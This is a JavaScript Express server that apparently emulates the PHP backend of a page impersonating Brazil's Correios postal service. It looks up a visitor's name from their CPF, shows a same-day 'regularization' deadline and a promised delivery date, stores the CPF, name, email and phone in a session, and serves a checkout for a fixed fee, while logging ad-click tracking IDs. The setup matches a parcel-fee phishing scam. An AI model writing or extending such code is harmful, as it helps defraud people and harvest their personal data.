import express from 'express';
import fs from 'fs';
import path from 'path';
import { fileURLToPath } from 'url';

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const rootDir = path.join(__dirname, '..');
const app = express();

const config = {
  amount: Number(process.env.AMOUNT || 58.36),
  product_key: process.env.PRODUCT_KEY || 'main',
  city: process.env.CITY || 'Curitiba',
  state: process.env.STATE || 'PR',
  cpf_lookup_nonce: process.env.CPF_LOOKUP_NONCE || 'bde6818eeddc0201f9b6d80e17acb948',
  customer_flow_nonce: process.env.CUSTOMER_FLOW_NONCE || 'e8581726cd6c71ddf21852cfe43c867d',
  checkout_cpf_nonce: process.env.CHECKOUT_CPF_NONCE || '92e3e85ff8d687d36f46624b1bfc10b6',
  cpf_database: {
    '52998224725': 'João Silva',
    '11144477735': 'Maria Souza',
    '39053344705': 'Carlos Mendes',
  },
};

// Load templates once at startup — fails fast if files are missing
const indexHtml = stripTopPhp(fs.readFileSync(path.join(rootDir, 'index.php'), 'utf8'));
const objetoHtml = stripTopPhp(fs.readFileSync(path.join(rootDir, 'objeto.php'), 'utf8'));
const checkoutHtml = stripTopPhp(fs.readFileSync(path.join(rootDir, 'checkout.php'), 'utf8'));

function stripTopPhp(src) {
  const m = src.match(/^<\?php[\s\S]*?\?>\s*/);
  return m ? src.slice(m[0].length) : src;
}

const sessions = new Map();

function normalizeCpf(cpf) {
  return String(cpf || '').replace(/\D/g, '').slice(0, 11);
}

function isValidCpf(cpf) {
  const digits = normalizeCpf(cpf);
  if (digits.length !== 11 || /^(\d)\1{10}$/.test(digits)) return false;
  for (let t = 9; t < 11; t++) {
    let sum = 0;
    for (let i = 0; i < t; i++) sum += Number(digits[i]) * (t + 1 - i);
    const check = ((10 * sum) % 11) % 10;
    if (Number(digits[t]) !== check) return false;
  }
  return true;
}

function formatCpf(cpf) {
  return normalizeCpf(cpf).replace(/^(\d{3})(\d{3})(\d{3})(\d{2})$/, '$1.$2.$3-$4');
}

function escapeHtml(v) {
  return String(v).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');
}

function getSessionId(req) {
  const m = (req.headers.cookie || '').match(/sid=([^;]+)/);
  if (m) return m[1];
  const sid = `sess_${Date.now().toString(36)}`;
  req.generatedSid = sid;
  return sid;
}

function getSession(req) {
  const sid = getSessionId(req);
  if (!sessions.has(sid)) sessions.set(sid, { customer: {}, tracking: {} });
  return { sid, data: sessions.get(sid) };
}

app.use(express.json());
app.use((req, res, next) => {
  const { sid, data } = getSession(req);
  if (req.generatedSid) res.setHeader('Set-Cookie', `sid=${req.generatedSid}; Path=/; HttpOnly; SameSite=Lax`);
  req.session = data;
  req.sid = sid;
  next();
});

app.get('/api.php', (req, res) => {
  const cpf = normalizeCpf(req.query.cpf);
  const nonce = String(req.query.nonce || '');
  if (![config.cpf_lookup_nonce, config.checkout_cpf_nonce].includes(nonce))
    return res.status(403).json({ found: false, error: 'Nonce invalido' });
  if (!isValidCpf(cpf)) return res.json({ found: false, error: 'CPF invalido' });
  const name = config.cpf_database[cpf];
  return name
    ? res.json({ found: true, data: { NOME: name } })
    : res.json({ found: false, error: 'Nao foi possivel consultar este CPF agora' });
});

app.post('/save_customer.php', (req, res) => {
  if (req.body?.nonce !== config.customer_flow_nonce)
    return res.status(403).json({ success: false, error: 'Nonce invalido' });
  const cpf = normalizeCpf(req.body?.cpf);
  const nome = String(req.body?.nome || '').trim();
  if (!isValidCpf(cpf) || nome.length < 3)
    return res.status(422).json({ success: false, error: 'Payload invalido' });
  req.session.customer = {
    cpf, nome, name: nome,
    email: req.body?.email || '',
    telefone: String(req.body?.telefone || '').replace(/\D/g, ''),
  };
  res.json({ success: true });
});

app.get('/objeto.php', (req, res) => {
  const cpf = normalizeCpf(req.query.cpf || req.session.customer?.cpf || '');
  const nome = String(req.query.nome || req.session.customer?.nome || req.session.customer?.name || 'Cliente').trim();
  if (cpf && nome) req.session.customer = { ...req.session.customer, cpf, nome, name: nome };

  const cpfFormatado = cpf ? formatCpf(cpf) : '000.000.000-00';
  const nomeExibicao = nome || 'Cliente';
  const primeiroNome = nomeExibicao.split(' ')[0];
  const hoje = new Date();
  const prazoRegularizacao = hoje.toLocaleDateString('pt-BR');
  const entrega = new Date(hoje);
  entrega.setDate(entrega.getDate() + 6);
  const prazoEntrega = entrega.toLocaleDateString('pt-BR');
  const tracking = req.session.tracking || {};
  const trackingQuery = new URLSearchParams(tracking).toString();
  const checkoutSuffix = trackingQuery ? `?${trackingQuery}` : '';

  const html = objetoHtml
    .replace(/<\?php echo htmlspecialchars\(\$nomeExibicao, ENT_QUOTES, 'UTF-8'\); \?>/g, escapeHtml(nomeExibicao))
    .replace(/<\?php echo htmlspecialchars\(\$cpfFormatado, ENT_QUOTES, 'UTF-8'\); \?>/g, escapeHtml(cpfFormatado))
    .replace(/<\?php echo htmlspecialchars\(\$primeiroNome, ENT_QUOTES, 'UTF-8'\); \?>/g, escapeHtml(primeiroNome))
    .replace(/<\?php echo htmlspecialchars\(\$cidade, ENT_QUOTES, 'UTF-8'\); \?>/g, escapeHtml(config.city))
    .replace(/<\?php echo htmlspecialchars\(\$estado, ENT_QUOTES, 'UTF-8'\); \?>/g, escapeHtml(config.state))
    .replace(/<\?php echo \$prazoEntrega; \?>/g, prazoEntrega)
    .replace(/<\?php echo \$prazoRegularizacao; \?>/g, prazoRegularizacao)
    .replace(/<\?php echo htmlspecialchars\(\$checkoutSuffix, ENT_QUOTES, 'UTF-8'\); \?>/g, checkoutSuffix);

  res.type('html').send(html);
});

app.get('/checkout.php', (req, res) => {
  const customer = req.session.customer || {};
  const amountFormatted = config.amount.toFixed(2).replace('.', ',');
  const tracking = req.session.tracking || {};
  const checkoutConfigScript = `<script>\n    window.CHECKOUT_CONFIG = ${JSON.stringify({
    initialCustomerName: customer.nome || customer.name || '',
    initialCustomerDocument: customer.cpf || '',
    customerEmail: customer.email || '',
    customerTelephone: customer.telefone || '',
    trackingData: tracking,
    productKey: config.product_key,
    cpfLookupNonce: config.checkout_cpf_nonce,
    amount: config.amount,
    clientScope: 'local',
  })};\n    </script>`;

  const html = checkoutHtml
    .replace(/<script>\s*window\.CHECKOUT_CONFIG[\s\S]*?<\/script>\s*/i, `${checkoutConfigScript}\n    `)
    .replace(/<\?php echo \$amountFormatted; \?>/g, amountFormatted);

  res.type('html').send(html);
});

app.get(['/', '/correios', '/index.php'], (req, res) => {
  const trackingKeys = ['utm_source', 'utm_medium', 'utm_campaign', 'utm_content', 'utm_term', 'src', 'campaign', 'fbclid', 'gclid', 'click_id'];
  trackingKeys.forEach((key) => {
    if (req.query[key]) req.session.tracking[key] = String(req.query[key]);
  });

  const trackingQuery = new URLSearchParams(req.session.tracking).toString();
  const appConfigScript = `<script>window.APP_CONFIG = ${JSON.stringify({
    cpfLookupNonce: config.cpf_lookup_nonce,
    customerFlowNonce: config.customer_flow_nonce,
    trackingUrl: trackingQuery,
  })};</script>`;

  const html = indexHtml.replace(/<script>\s*window\.APP_CONFIG[\s\S]*?<\/script>\s*/i, `${appConfigScript}\n  `);
  res.type('html').send(html);
});

app.use(express.static(path.join(rootDir, 'public'), { index: false }));

export default app;
